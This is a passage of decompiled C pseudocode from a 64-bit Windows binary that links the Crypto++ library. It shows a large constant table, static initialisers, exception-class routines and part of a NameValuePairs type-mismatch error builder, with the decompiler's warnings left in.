  -657058364081607645i64,
  -4144582592088597201i64,
  -1543572385970354692i64,
  1272420196377025369i64,
  -8060592964305203315i64,
  -3591799556642621434i64,
  -7205783112541248647i64,
  -6083967022095275823i64,
  -3061293537137439291i64,
  -6444164408621940560i64,
  -5558163232391937078i64,
  2384722391217975686i64,
  -1538526253773512234i64,
  -8967379738488866076i64,
  2180729794294632317i64,
  -8101511370197266304i64,
  -4959839817741754517i64,
  3170224487580660322i64,
  5306423718534457972i64,
  -6879828249462803785i64,
  2598894969246811693i64,
  3808526526014414316i64,
  1534236131511039507i64,
  -7613106113790440958i64,
  -3690963471633724639i64,
  -1443949468059922580i64,
  -988746485472469958i64,
  1930209847354335965i64,
  1688121467175832441i64,
  4568645395035961371i64,
  1663586930301492580i64,
  -2369990967631897399i64,
  6401977002312423636i64,
  -1768352187758609559i64,
  -1333936946157443119i64,
  5652937408108254159i64,
  -4648292607854132718i64,
  1059650547862624826i64,
  5709863211179361702i64,
  -6621500382539150386i64,
  -2944237889838824376i64,
  2027954661705595492i64,
  8215231547891641899i64,
  -3508338337327497548i64,
  -4588258939116514411i64,
  -7439150847346660162i64,
  7643262015353627426i64,
  -358610338376567284i64,
  -6944570724391851860i64,
  5543505703433040686i64,
  -7037464179549665439i64,
  234123230707214373i64,
  -8245709362265813664i64,
  8687643662156041196i64,
  -741640480254972920i64,
  -6574984784285190458i64,
  -2868029287443364985i64,
  -6644738359553631939i64,
  -529692295645201061i64,
  -30493710697488641i64,
  -5176793896206863121i64,
  7015448854468254335i64,
  4692132875394022940i64,
  1298415186063245956i64,
  -124118010954125943i64,
  -6859171814026152991i64,
  -387519610658966745i64,
  -7417509925386959576i64,
  7303779074140378331i64,
  7153170521964585482i64,
  7751526325049234609i64,
  -6213230561972701927i64,
  438604167151504114i64,
  -6167395703262965421i64,
  441400211681528415i64,
  -3137142860913264920i64,
  10104992688715948i64,
  -8655198131267647560i64,
  -7508658281126427823i64,
  -1173688169225038695i64,
  -8227280434215645410i64,
  8547440536980173347i64,
  3162401443502250530i64,
  2003127264914057390i64,
  -303348837841527728i64,
  -5279409003593834101i64,
  355437034607198011i64,
  3767721084249794671i64,
  -4371958141615675958i64,
  3317021928174454880i64,
  -3011998475573854488i64,
  6059249438071500707i64,
  8041213231006698713i64,
  1722714439366217001i64,
  180067195496458683i64,
  2418534861857088969i64,
  -8663445401665639609i64,
  -7563058573588099674i64,
  407639482336156705i64,
  -2596861656880646454i64,
  -300315388397682104i64,
  -6169079645592058082i64,
  4815762170000206168i64,
  4559113724734384983i64,
  9073934668436286811i64,
  -580903980235490057i64,
  8871154357002525579i64,
  1600735777479032598i64,
  6107178784551779487i64,
  7756534000889007957i64,
  752315753130707424i64,
  5631109431935685174i64,
  7327734386556657509i64,
  -1028757264550858589i64,
  7952677511417787692i64,
  3036398554562696090i64,
  7703552060217702276i64,
  -3734975793798176162i64,
  -8370135145625222524i64,
  4706390371990844367i64,
  8313682064869184490i64,
  1560223118853323875i64,
  8364674754823395238i64,
  -5439374557464470892i64,
  -4314214264257699634i64,
  -5234293851147287224i64,
  8961413138178973224i64,
  4689554547762229339i64,
  -2031836827731301766i64,
  -1210772663133553515i64,
  3259806941460372721i64,
  5273937983453971842i64,
  6766066482496735471i64,
  -3079282394521333570i64,
  -7304841362910679309i64,
  6610372467472910785i64,
  -2233116128579860804i64,
  522053902491994649i64,
  -2804356939844033121i64,
  -6538655066651602193i64,
  -5027725048237179858i64,
  4880736556107907693i64,
  3260015653356090719i64,
  553679597192038183i64,
  3927654500956201765i64,
  372622282291724377i64,
  -3208056094330763046i64,
  -2599455300983472519i64,
  5535039150912319990i64,
  -3988834949017625060i64,
  9016379253384665012i64,
  860544580935008228i64,
  -4165096681838547954i64,
  -5077865088361036037i64,
  4047921134704311029i64,
  -1981295694361476328i64,
  -5445517178336056638i64,
  883420816591318482i64,
  -5894018995742267053i64,
  -8140441379765124708i64,
  3831845084744039443i64,
  4825512674534131401i64,
  -6852156031988013373i64,
  -1283580361819107761i64,
  -5383480168616602117i64,
  -4613241052632147588i64,
  -225672475979217082i64,
  8839710114808706225i64,
  8017046196538255936i64,
  -1713326229521496695i64,
  -6759532252538016877i64,
  9052386762781720116i64,
  9209234446547420499i64,
  7305246956040233775i64,
  9021252675729042295i64,
  3661799050693695589i64,
  2415902964664558007i64,
  -6328599225714948637i64,
  5776893563725658543i64,
  -8762845105051977857i64,
  -2528441317059407290i64,
  -6122871804743009664i64,
  -918084755760628942i64,
  -6209004878098504322i64,
  -7791216861119009678i64,
  -4264646697701958480i64,
  1686318328255961235i64,
  6672684390108525829i64,
  -8423381327490606135i64,
  6595937867586071084i64,
  -8694133748660558873i64,
  -7728927879140316607i64,
  -8547735683213123151i64,
  6313503518945127416i64,
  -33314287432168419i64,
  2944710123286372929i64,
  -6266280862371481550i64,
  2105852594736332740i64,
  -3432361565041089445i64,
  5001090115361630413i64,
  -8929581229098089513i64,
  3527133155590477223i64,
  -2855483515466410257i64,
  -825122663322144899i64,
  1361219503203285426i64,
  4939298430712769963i64,
  -1601916733780918106i64,
  4073819792569534929i64,
  69675013287280042i64,
  -7852218821352872487i64,
  -8111453326930787193i64,
  -7195486556292071823i64,
  75648010713662885i64,
  -3313443615126026286i64,
  6097640418031225668i64,
  8443543169888246181i64,
  1354674278362325547i64,
  -2547971451244840787i64,
  -4320964364205765636i64,
  6099371495609966410i64,
  -1128700026175378437i64,
  327397591683314451i64,
  4730471489247303685i64,
  -287660334668441341i64,
  -3103088340541473955i64,
  4080761569130571102i64,
  2102376007557749875i64,
  6207553095492018070i64,
  -8760635832387543231i64,
  2123682557259297804i64,
  8047376003039816914i64,
  -8641859304000981254i64,
  -5853559639718993380i64,
  8802885103873672879i64,
  -7791885884557820225i64,
  -346044173054923034i64,
  3453556361734937596i64,
  -4794136256853036461i64,
  214107818028322162i64,
  -4076011261590998913i64,
  2465800654166695724i64,
  1930827197059226111i64,
  -4809824884034259168i64,
  6458896585757909380i64,
  8687795639394786443i64,
  8158627064076862023i64,
  9111701851972917522i64,
  -3850151484740951790i64,
  -8769309236952404739i64,
  6265049803444222065i64,
  -8816471141658447479i64,
  2488985226740761479i64,
  5280434307524477277i64,
  -3313591420701474784i64,
  9085638845162508808i64,
  -2201085926229475339i64,
  6221956898239513411i64,
  -1640787046973236684i64,
  7966562432013536999i64,
  5448909282452393401i64,
  -4685623738947610496i64,
  1312863702796963096i64,
  -3777336134491571216i64,
  -3519224186143305010i64,
  5536293446170021174i64,
  8655431307028266682i64,
  -6106354842062819023i64,
  -5068719534291825734i64,
  -1997262021701664478i64,
  -751326254443736221i64,
  5307408630085921678i64,
  8014637672462110416i64,
  6839680297362422790i64,
  -9155992531565470549i64,
  7683304994819379152i64,
  -6215231054770502405i64,
  5011967420256469483i64,
  7707140181470325430i64,
  -1488010365043996864i64,
  -7641626301368045047i64,
  -7892158867021762912i64,
  7437835549140552152i64,
  4244508651726358361i64,
  2471685255109535741i64,
  -426371207583692450i64,
  -4849602684976414053i64,
  4641976063132681959i64,
  -644297267476689974i64,
  7772486085704725643i64,
  -5260155076572617246i64,
  9052819637908085852i64,
  -5520815965451297400i64,
  -7966363200477548022i64,
  5331884785340556013i64,
  -1251514561689350743i64,
  4999404476211186321i64,
  -8284388172552172675i64,
  -9196762286787063932i64,
  7053733962830568010i64,
  2873511915072815162i64,
  -5071995723686977013i64,
  8470938061039116047i64,
  4161632365581594768i64,
  7646254430836963254i64,
  6156183762110087107i64,
  6951684714744137383i64,
  132874071763684070i64,
  -4226088873447498356i64,
  -4734031612958738301i64,
  -6607140907552965554i64,
  1405198011812174368i64,
  -294992473434354132i64,
  -4882284125360719002i64,
  6340994416431025108i64,
  -5632235500007893784i64,
  3601832435857668514i64,
  -4126351676380220119i64,
  6859196873157236629i64,
  2144811790901907506i64,
  -4519398807939331677i64,
  -3421177576820857449i64,
  -2519813894052345977i64,
  -4617038029158490256i64,
  8368488986947006806i64,
  5902004924686782186i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1CA110[9] = { 2i64, 5353506976i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
int dword_13F1CA168 = -2147483644; // weak
__int64 qword_13F1CA180 = 0i64; // weak
__int64 qword_13F1CA188 = 0i64; // weak


//----- (000000013F101000) ----------------------------------------------------
__int64 sub_13F101000()
{
  sub_13F106C30((__m128i *)&qword_13F1B7028, (const __m128i *)&qword_13F182E58);
  return sub_13F140874((__int64)sub_13F17F4D0);
}
// 13F101000: using guessed type __int64 __fastcall sub_13F101000();
// 13F182E58: using guessed type __int64 qword_13F182E58;
// 13F1B7028: using guessed type __int64 qword_13F1B7028;

//----- (000000013F101030) ----------------------------------------------------
__int64 sub_13F101030()
{
  sub_13F106C30((__m128i *)&qword_13F1B7008, (const __m128i *)byte_13F19C050);
  return sub_13F140874((__int64)sub_13F17F540);
}
// 13F101030: using guessed type __int64 __fastcall sub_13F101030();
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F101060) ----------------------------------------------------
__int64 sub_13F101060()
{
  return sub_13F140874((__int64)sub_13F17F5C0);
}
// 13F101060: using guessed type __int64 __fastcall sub_13F101060();

//----- (000000013F101070) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F101070()
{
  off_13F1C43C8 = (__int64 (__fastcall *(*)[4])())off_13F185278;
  xmmword_13F1C43D8 = (__int128)_mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  qword_13F1C43E8 = sub_13F123740((__int64)&qword_13F1C43D0, 2ui64);
  dword_13F1C43F0 = 0;
  MEMORY[0x3C2A00] = 1i64;
  MEMORY[0x3C2A08] = 0i64;
  return sub_13F140874((__int64)sub_13F17F5E0);
}
// 13F101082: write access to const memory at 13F1C4384 has been detected
// 13F10109B: write access to const memory at 13F1C43C8 has been detected
// 13F1010A9: write access to const memory at 13F1C43D8 has been detected
// 13F1010BC: write access to const memory at 13F1C43E8 has been detected
// 13F1010C3: write access to const memory at 13F1C43F0 has been detected
// 13F101070: using guessed type __int64 __fastcall sub_13F101070();
// 13F17F5E0: using guessed type __int64 __fastcall sub_13F17F5E0();
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1C43C8: using guessed type __int64 (__fastcall *(*off_13F1C43C8)[4])();
// 13F1C43D0: using guessed type __int64 qword_13F1C43D0;
// 13F1C43D8: using guessed type __int128 xmmword_13F1C43D8;
// 13F1C43E8: using guessed type __int64 qword_13F1C43E8;
// 13F1C43F0: using guessed type int dword_13F1C43F0;

//----- (000000013F1010F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1010F0()
{
  off_13F1C43F8 = (__int64 (__fastcall *(*)[4])())off_13F185278;
  xmmword_13F1C4408 = (__int128)_mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  qword_13F1C4418 = sub_13F123740((__int64)&qword_13F1C4400, 2ui64);
  dword_13F1C4420 = 0;
  MEMORY[0x3C2A30] = 2i64;
  MEMORY[0x3C2A38] = 0i64;
  return sub_13F140874((__int64)sub_13F17F630);
}
// 13F101102: write access to const memory at 13F1C4384 has been detected
// 13F10111B: write access to const memory at 13F1C43F8 has been detected
// 13F101129: write access to const memory at 13F1C4408 has been detected
// 13F10113C: write access to const memory at 13F1C4418 has been detected
// 13F101143: write access to const memory at 13F1C4420 has been detected
// 13F1010F0: using guessed type __int64 __fastcall sub_13F1010F0();
// 13F17F630: using guessed type __int64 __fastcall sub_13F17F630();
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1C43F8: using guessed type __int64 (__fastcall *(*off_13F1C43F8)[4])();
// 13F1C4400: using guessed type __int64 qword_13F1C4400;
// 13F1C4408: using guessed type __int128 xmmword_13F1C4408;
// 13F1C4418: using guessed type __int64 qword_13F1C4418;
// 13F1C4420: using guessed type int dword_13F1C4420;

//----- (000000013F101170) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F101170()
{
  off_13F1C4398 = (__int64 (__fastcall *(*)[4])())off_13F185278;
  xmmword_13F1C43A8 = (__int128)_mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  qword_13F1C43B8 = sub_13F123740((__int64)&qword_13F1C43A0, 2ui64);
  dword_13F1C43C0 = 0;
  MEMORY[0x3C29A0] = 0i64;
  MEMORY[0x3C29A8] = 0i64;
  return sub_13F140874((__int64)sub_13F17F680);
}
// 13F101182: write access to const memory at 13F1C4384 has been detected
// 13F10119B: write access to const memory at 13F1C4398 has been detected
// 13F1011A9: write access to const memory at 13F1C43A8 has been detected
// 13F1011BC: write access to const memory at 13F1C43B8 has been detected
// 13F1011C3: write access to const memory at 13F1C43C0 has been detected
// 13F101170: using guessed type __int64 __fastcall sub_13F101170();
// 13F17F680: using guessed type __int64 __fastcall sub_13F17F680();
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();
// 13F1C43A0: using guessed type __int64 qword_13F1C43A0;
// 13F1C43A8: using guessed type __int128 xmmword_13F1C43A8;
// 13F1C43B8: using guessed type __int64 qword_13F1C43B8;
// 13F1C43C0: using guessed type int dword_13F1C43C0;

//----- (000000013F101210) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F101210()
{
  qword_13F1B70B0 = sub_13F132BE0((__int64)&qword_13F1B7098, 1ui64);
  MEMORY[0x3CD3B0] = 1i64;
  return sub_13F140874((__int64)sub_13F17F700);
}
// 13F10122F: write access to const memory at 13F1B70B0 has been detected
// 13F101210: could not find valid save-restore pair for rdi
// 13F101210: using guessed type __int64 __fastcall sub_13F101210();
// 13F17F700: using guessed type __int64 __fastcall sub_13F17F700();
// 13F1B7098: using guessed type __int64 qword_13F1B7098;
// 13F1B70B0: using guessed type __int64 qword_13F1B70B0;

//----- (000000013F101280) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F101280()
{
  qword_13F1B7090 = sub_13F132BE0((__int64)&qword_13F1B7078, 0i64);
  return sub_13F140874((__int64)sub_13F17F750);
}
// 13F10129C: write access to const memory at 13F1B7090 has been detected
// 13F101280: using guessed type __int64 __fastcall sub_13F101280();
// 13F1B7078: using guessed type __int64 qword_13F1B7078;
// 13F1B7090: using guessed type __int64 qword_13F1B7090;

//----- (000000013F1012B0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1012B0()
{
  sub_13F1401D0(&qword_13F1B70C8);
  sub_13F1401D0(&qword_13F1B70E8);
  byte_13F1B7108 = 1;
  return sub_13F140874((__int64)sub_13F17F7A0);
}
// 13F1012D6: write access to const memory at 13F1B7108 has been detected
// 13F1012B0: using guessed type __int64 __fastcall sub_13F1012B0();
// 13F1B70C8: using guessed type __int64 qword_13F1B70C8;
// 13F1B70E8: using guessed type __int64 qword_13F1B70E8;
// 13F1B7108: using guessed type char byte_13F1B7108;

//----- (000000013F1012F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1012F0()
{
  sub_13F112CF0((__int64)off_13F1B7118);
  sub_13F112CF0((__int64)off_13F1B7148);
  byte_13F1B7178 = 1;
  return sub_13F140874((__int64)sub_13F17F830);
}
// 13F101316: write access to const memory at 13F1B7178 has been detected
// 13F1012F0: using guessed type __int64 __fastcall sub_13F1012F0();
// 13F17F830: using guessed type __int64 __fastcall sub_13F17F830();
// 13F1B7118: using guessed type __int64 (__fastcall *(*off_13F1B7118[2])[4])();
// 13F1B7148: using guessed type __int64 (__fastcall *(*off_13F1B7148[2])[4])();
// 13F1B7178: using guessed type char byte_13F1B7178;

//----- (000000013F101330) ----------------------------------------------------
__int64 sub_13F101330()
{
  return sub_13F140874((__int64)sub_13F17F8BC);
}
// 13F101330: using guessed type __int64 __fastcall sub_13F101330();

//----- (000000013F10133C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 *sub_13F10133C()
{
  __int64 *result; // rax

  result = sub_13F16800C(2u);
  off_13F1C5D40 = (__int64 (*)[2])result;
  return result;
}
// 13F10134A: write access to const memory at 13F1C5D40 has been detected
// 13F1C5D40: using guessed type __int64 (*off_13F1C5D40)[2];

//----- (000000013F101358) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
uintptr_t sub_13F101358()
{
  uintptr_t result; // rax

  result = sub_13F14291C();
  qword_13F1C5DF0 = result;
  return result;
}
// 13F101361: write access to const memory at 13F1C5DF0 has been detected
// 13F1C5DF0: using guessed type __int64 qword_13F1C5DF0;

//----- (000000013F101370) ----------------------------------------------------
void sub_13F101370()
{
  JUMPOUT(0x77202BF0i64);
}
// 13F101377: control flows out of bounds to 77202BF0

//----- (000000013F101380) ----------------------------------------------------
__int64 sub_13F101380()
{
  sub_13F178228((__int64)qword_13F1C6AA0);
  return sub_13F140874((__int64)sub_13F17F8C8);
}
// 13F101380: using guessed type __int64 __fastcall sub_13F101380();
// 13F17F8C8: using guessed type __int64 __fastcall sub_13F17F8C8();
// 13F1C6AA0: using guessed type __int64 qword_13F1C6AA0[2];

//----- (000000013F1013A0) ----------------------------------------------------
__int64 sub_13F1013A0()
{
  return sub_13F140874((__int64)sub_13F17F8D4);
}
// 13F1013A0: using guessed type __int64 __fastcall sub_13F1013A0();

//----- (000000013F1013AC) ----------------------------------------------------
__int64 sub_13F1013AC()
{
  return sub_13F140874((__int64)sub_13F17F8E0);
}
// 13F1013AC: using guessed type __int64 __fastcall sub_13F1013AC();

//----- (000000013F1013C4) ----------------------------------------------------
__int64 sub_13F1013C4()
{
  sub_13F178228((__int64)qword_13F1C6EB0);
  return sub_13F140874((__int64)sub_13F17F970);
}
// 13F1013C4: using guessed type __int64 __fastcall sub_13F1013C4();
// 13F17F970: using guessed type __int64 __fastcall sub_13F17F970();
// 13F1C6EB0: using guessed type __int64 qword_13F1C6EB0[2];

//----- (000000013F1013F0) ----------------------------------------------------
__int64 *sub_13F1013F0()
{
  return qword_13F1C70E0;
}
// 13F1C70E0: using guessed type __int64 qword_13F1C70E0[2];

//----- (000000013F101400) ----------------------------------------------------
_QWORD *__fastcall sub_13F101400(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  return a1;
}

//----- (000000013F101460) ----------------------------------------------------
const char *__fastcall sub_13F101460(__int64 a1)
{
  const char *result; // rax

  result = "Unknown exception";
  if ( *(_QWORD *)(a1 + 8) )
    return *(const char **)(a1 + 8);
  return result;
}

//----- (000000013F101480) ----------------------------------------------------
_QWORD *__fastcall sub_13F101480(_QWORD *a1, char a2)
{
  *a1 = &std::exception::`vftable';
  sub_13F15E4FC((__int64)(a1 + 1));
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1014D0) ----------------------------------------------------
signed __int64 __fastcall sub_13F1014D0(__int64 a1)
{
  return sub_13F15E554(a1 + 8, (__int64)qword_13F1C5720);
}
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F1014E0) ----------------------------------------------------
__int64 __fastcall sub_13F1014E0(_QWORD *a1)
{
  unsigned __int64 v2; // rdx
  __int64 v3; // rcx
  unsigned __int64 v4; // rdx

  *a1 = off_13F181CA8;
  v2 = a1[7];
  if ( v2 >= 0x10 )
  {
    v3 = a1[4];
    v4 = v2 + 1;
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v3 = *(_QWORD *)(v3 - 8);
    }
    sub_13F14088C(v3, v4);
  }
  a1[6] = 0i64;
  a1[7] = 15i64;
  *((_BYTE *)a1 + 32) = 0;
  *a1 = &std::exception::`vftable';
  return sub_13F15E4FC((__int64)(a1 + 1));
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();

//----- (000000013F101560) ----------------------------------------------------
__int64 __fastcall sub_13F101560(__int64 a1, int a2, const __m128i *a3)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2;
  sub_13F1053F0((__m128i **)(a1 + 32), a3);
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();

//----- (000000013F1015B0) ----------------------------------------------------
__int64 __fastcall sub_13F1015B0(__int64 a1)
{
  __int64 result; // rax

  result = a1 + 32;
  if ( *(_QWORD *)(a1 + 56) >= 0x10ui64 )
    return *(_QWORD *)result;
  return result;
}

//----- (000000013F1015C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1015C0(_QWORD *a1, char a2)
{
  sub_13F1014E0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 64i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F101600) ----------------------------------------------------
__int64 __fastcall sub_13F101600(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 1;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = off_13F181CC0;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CC0: using guessed type __int64 (__fastcall *off_13F181CC0[3])();

//----- (000000013F101660) ----------------------------------------------------
__int64 __fastcall sub_13F101660(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 0;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = off_13F181CD8;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();

//----- (000000013F1016B0) ----------------------------------------------------
__int64 __fastcall sub_13F1016B0(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 2;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = off_13F183410;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F183410: using guessed type __int64 (__fastcall *off_13F183410[3])();

//----- (000000013F101700) ----------------------------------------------------
void **__fastcall sub_13F101700(_QWORD *a1)
{
  void **result; // rax

  result = &CryptoPP::NameValuePairs::`vftable';
  *a1 = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F101710) ----------------------------------------------------
__int64 __fastcall sub_13F101710(__int64 a1, const __m128i *a2, __int64 a3, __int64 a4)
{
  const __m128i *v6; // rdi
  const __m128i *v8; // r14
  unsigned __int64 v9; // rdx
  __int64 v10; // rbx
  unsigned __int64 v11; // r14
  __m128i v12; // kr00_16
  __m128i *v13; // rbx
  __m128i *v14; // rbx
  __m128i v15; // kr10_16
  __m128i *v16; // rbx
  __m128i *v17; // rbx
  __m128i *v18; // rax
  const __m128i *v19; // rax
  unsigned __int64 v20; // rdi
  unsigned __int64 v21; // r8
  __m128i *v22; // rax
  __m128i v23; // kr20_16
  __m128i *v24; // rbx
  __m128i *v25; // rbx
  __m128i *v26; // rax
  const __m128i *v27; // rax
  __m128i *v28; // rax
  __m128i v29; // kr30_16
  __m128i *v30; // rbx
  __m128i *v31; // rbx
  __m128i *v32; // rax
  __int64 v33; // rdx
  __int64 v34; // rcx
  __int64 v35; // rdx
  __int64 v36; // rcx
  __int64 v37; // rdx
  __int64 v38; // rcx
  __int64 v39; // rdx
  __int64 v40; // rcx
  __int64 v41; // rdx
  __int64 v42; // rcx
  __int64 v43; // rdx
  __int64 v44; // rcx
  __m128i v46; // [rsp+38h] [rbp-C8h] BYREF
  __m128i si128; // [rsp+48h] [rbp-B8h]
  __m128i v48; // [rsp+58h] [rbp-A8h] BYREF
  __m128i v49; // [rsp+68h] [rbp-98h]
  __m128i v50; // [rsp+78h] [rbp-88h] BYREF
  __m128i v51; // [rsp+88h] [rbp-78h]
  __m128i v52; // [rsp+98h] [rbp-68h] BYREF
  __m128i v53; // [rsp+A8h] [rbp-58h]
  __m128i v54; // [rsp+B8h] [rbp-48h] BYREF
  __m128i v55; // [rsp+C8h] [rbp-38h]
  __m128i v56; // [rsp+D8h] [rbp-28h] BYREF
  __m128i v57; // [rsp+E8h] [rbp-18h]
  __int64 v58; // [rsp+F8h] [rbp-8h]
  __int64 v59; // [rsp+100h] [rbp+0h]

  v58 = -2i64;
  v6 = a2;
  v59 = a1;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v46.m128i_i8[0] = 0;
  v8 = a2 + 1;
  v9 = a2[1].m128i_i64[0] + 35;
  if ( v9 >= 0x10 )
  {
    sub_13F107980(&v46, v9);
    si128.m128i_i64[0] = 0i64;
  }
  if ( si128.m128i_i64[1] < 0x23ui64 )
  {
    sub_13F107AD0(&v46, 0x23ui64, 0i64, (const __m128i *)"NameValuePairs: type mismatch for '", 0x23ui64);
  }
  else
  {
    si128.m128i_i64[0] = 35i64;
    v10 = v46.m128i_i64[0];
    sub_13F15EB00((__m128i *)v46.m128i_i64[0], (const __m128i *)"NameValuePairs: type mismatch for '", 0x23ui64);
    *(_BYTE *)(v10 + 35) = 0;
  }
  if ( v6[1].m128i_i64[1] >= 0x10ui64 )
    v6 = (const __m128i *)v6->m128i_i64[0];
  v11 = v8->m128i_i64[0];
  v12 = si128;
  if ( v11 > si128.m128i_i64[1] - si128.m128i_i64[0] )
  {
    sub_13F107AD0(&v46, v11, 0i64, v6, v11);
  }
  else
  {
    si128.m128i_i64[0] += v11;
    v13 = &v46;
    if ( v12.m128i_i64[1] >= 0x10ui64 )
      v13 = (__m128i *)v46.m128i_i64[0];
    v14 = (__m128i *)((char *)v13 + v12.m128i_i64[0]);
    sub_13F15EB00(v14, v6, v11);
    v14->m128i_i8[v11] = 0;
  }
  v15 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 0xBui64 )
  {
    v18 = sub_13F107AD0(&v46, 0xBui64, 0i64, (const __m128i *)"', stored '", 0xBui64);
  }
  else
  {
    si128.m128i_i64[0] += 11i64;
    v16 = &v46;
    if ( v15.m128i_i64[1] >= 0x10ui64 )
      v16 = (__m128i *)v46.m128i_i64[0];
    v17 = (__m128i *)((char *)v16 + v15.m128i_i64[0]);
    sub_13F15EB00(v17, (const __m128i *)"', stored '", 0xBui64);
    v17->m128i_i8[11] = 0;
    v18 = &v46;
  }
  v55 = 0i64;
  v54 = *v18;
  v55 = v18[1];
  v18[1].m128i_i64[0] = 0i64;
  v18[1].m128i_i64[1] = 15i64;
  v18->m128i_i8[0] = 0;
  v19 = (const __m128i *)sub_13F15E554(a3 + 8, (__int64)qword_13F1C5720);
  v20 = -1i64;
  v21 = -1i64;
  do
    ++v21;
  while ( v19->m128i_i8[v21] );
  v22 = sub_13F106DB0(&v54, v19, v21);
  v51 = 0i64;
  v50 = *v22;
  v51 = v22[1];
  v22[1].m128i_i64[0] = 0i64;
  v22[1].m128i_i64[1] = 15i64;
  v22->m128i_i8[0] = 0;
  v23 = v51;
  if ( v51.m128i_i64[1] - v51.m128i_i64[0] < 0x17ui64 )
  {
